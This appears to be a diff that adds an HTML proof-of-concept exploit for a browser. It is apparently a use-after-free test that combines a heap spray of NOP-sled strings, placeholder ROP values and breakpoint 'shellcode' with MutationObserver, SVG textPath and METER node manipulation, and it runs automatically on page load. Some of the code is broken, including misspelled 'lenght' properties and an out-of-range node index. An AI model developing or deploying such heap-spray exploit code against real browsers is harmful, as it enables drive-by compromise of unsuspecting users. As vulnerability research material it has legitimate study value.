@@ -1,0 +1,106 @@
+<!doctype html>
+<html>
+	<head>
+	
+	<div id="blah"></div>
+	<script language = 'javascript'>
+	        
+			
+			function testcase()
+			{
+				var div_container = document.getElementById("blah");
+				div_container.style.cssText = "display:none";
+				var data;
+				offset = 0x104;    // era 104
+				junk = unescape("%u9090%u9090");
+				while (junk.lenght < 0x4000) junk += junk;     // era 1000
+	
+				rop = unescape("%u4141%u4141%u4242%u4242%u4343%u4343%u4444%u4444%u4545%u4545%u4646%u4646%u4747%u4747");
+				shellcode = unescape("%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc");
+				data = junk.substring(0,offset) + rop + shellcode
+				data += junk.substring(0, 0x80000-offset-rop.length-shellcode.lenght);   //era 800      0x80000-offset-rop.length-shellcode.lenght
+	
+				while (data.length < 0x80000) data += data;    // era 0x80000
+	
+	
+				for (var i = 0; i < 0x7000; i++)
+				{
+					var obj = document.createElement("button");
+					obj.title = data.substring(0, 0x500-0x58);   // 0, 0x500-0x58
+					div_container.appendChild(obj);
+				}
+				alert("spray done");
+			
+				
+				newNode=document.createElementNS('http://www.w3.org/2000/svg','textPath');    // node1 
+				var observerObject = new MutationObserver(moEH);
+				
+								
+				//var s=document.createElement("script");
+				document.write("\u4141");
+				//s.innerText='var tl = 0;var str = "";for (var i=tl;i<(tl+10);i++) { str += "\u4141\u4141\u4242\u4242\u4343\u4343\u4444\u4444\u4545\u4545"; } document.write(str);';
+				//eval(s.innerText);
+								
+				allNodes=[];
+				allNodes.push(newNode);	// 0
+		
+				
+				
+				allNodes.push(newNode);	// 1
+				
+				
+				newNode=document.createElement('METER');  // node2
+				allNodes.push(newNode);
+				//initializeParam=newNode;
+				currElem=newNode;
+				var observerObject = new MutationObserver(moEH);
+				observerObject.observe(currElem, { childList: true, subtree: true});
+				
+				
+				
+				allNodes.push(newNode);	// 2
+				
+				
+				
+				allNodes.push(newNode);	// 3
+				
+
+				newNode=document.createElement('lalala');    // node3
+				allNodes.push(newNode);	// 4
+				root=allNodes[2];
+				root.appendChild(newNode);
+				newNode=document.createElement('boboboo');    // node4
+				allNodes.push(newNode);	// 5
+				
+				
+				
+				var s=document.createElement("script");
+				s.innerText='setTimeout(function(){tick();},0);';
+				document.body.appendChild(s);
+								
+				var n1 = allNodes[5];
+				var n2 = allNodes[6];
+							
+				
+				iBParam1=n1;iBParam2=n2; 
+				q1=iBParam1;
+				q2=iBParam2;
+				q1.parentNode.insertBefore(q2, q1);
+				//document.write('end');
+    			
+			}
+        
+		function moEH(mutationRecordList){
+			
+		}			
+
+		</script>
+	</head>
+	
+	<body onload='testcase();'>
+	
+	
+	
+		
+	</body>
+</html>
